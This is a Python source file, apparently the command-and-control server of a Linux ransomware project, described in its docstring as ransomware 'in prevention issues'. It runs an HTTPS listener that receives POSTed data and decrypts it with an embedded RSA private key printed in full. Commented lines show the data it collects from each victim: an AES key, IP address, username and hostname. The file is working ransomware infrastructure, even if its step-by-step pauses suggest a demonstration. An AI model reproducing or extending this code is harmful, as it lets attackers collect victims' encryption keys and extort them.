#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ransomware for GNU/Linux systems in prevention issues
Usage::
	./server.py
"""

import logging
import urllib.parse
import base64
import ast
import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

#SRV_IP = '127.0.0.1'
#SRV_PORT = 80
SRV_IP = 'localhost'
SRV_PORT = 443
SRV_CERT = 'server.pem'

# colors
WHITE = '\033[0m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
DEBUGBLUE = '\033[94m[#]\033[0m '
WARNINGRED = '\033[91m[-]\033[0m '
WARNINGRE = '\n\033[92m[+]\033[0m '
INFOYELLOW = '\033[93m[~]\033[0m '

# RSA private key
PRIV_KEY_TXT = """-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""

class LocalServer(BaseHTTPRequestHandler):
	def _set_response(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def do_POST(self):
		self._set_response()

		content_length = int(self.headers['Content-Length']) # Récupérer la taille des données reçues
		post_data = self.rfile.read(content_length)		     # Lire les données

		print(f"{WARNINGRE}Données réceptionnées: {type(post_data)}\n{post_data}")

		# urldecode
		enter = input('ENTER')
		post_data = urllib.parse.unquote(post_data)
		print(f"{WARNINGRE}urldecode(): {type(post_data)}\n{post_data}")

		# <str> to <list>, list[1]
		enter = input('ENTER')
		ciphertext = post_data.split('=', 1)[1]
		print(f"{WARNINGRE}Données splitées: {type(ciphertext)}\n{ciphertext}")

		# base64 decode
		enter = input('ENTER')
		ciphertext = base64.b64decode(ciphertext)
		print(f"{WARNINGRE}base64.b64decode(): {type(ciphertext)}\n{ciphertext}")

		# Déchiffrement
		enter = input('ENTER')
		print(f"{WARNINGRE}RSA-4096 bits clé privée, utilisée pour le déchiffrement des données:\n{PRIV_KEY_TXT}")

		priv_key = RSA.importKey(PRIV_KEY_TXT) 
		decipher = PKCS1_OAEP.new(priv_key)
		try:
			plaintext = decipher.decrypt(ciphertext)
			print(f"{WARNINGRE}Données déchiffrées: {type(plaintext)}\n{plaintext}")

			# bytes decode
			enter = input('ENTER')
			plaintext = plaintext.decode()
			print(f"{WARNINGRE}Données décodées: {type(plaintext)}\n{plaintext}")

			# <str> to <list>
			enter = input('ENTER')
			plaintext = ast.literal_eval(plaintext)
			print(f"{WARNINGRE}Convertir en : {type(plaintext)}")
			for i in plaintext:
				print(f"- {i}")

			#aes_key   = plaintext[0]
			#public_ip = plaintext[1]
			#username  = plaintext[2]
			#hostname  = plaintext[3]
			#version   = plaintext[4]
			#date_time = plaintext[5]
		except:
			pass

def main():
	logging.basicConfig(level=logging.INFO)

	httpd = HTTPServer((SRV_IP, SRV_PORT), LocalServer)
	httpd.socket = ssl.wrap_socket(httpd.socket, certfile=SRV_CERT, server_side=True)

	logging.info(f"Starting httpd on {SRV_IP}:{SRV_PORT}...\n")

	try:
		httpd.serve_forever()
	except KeyboardInterrupt:
		pass

	httpd.server_close()
	logging.info("Stopping httpd...\n")

if __name__ == '__main__':
	main()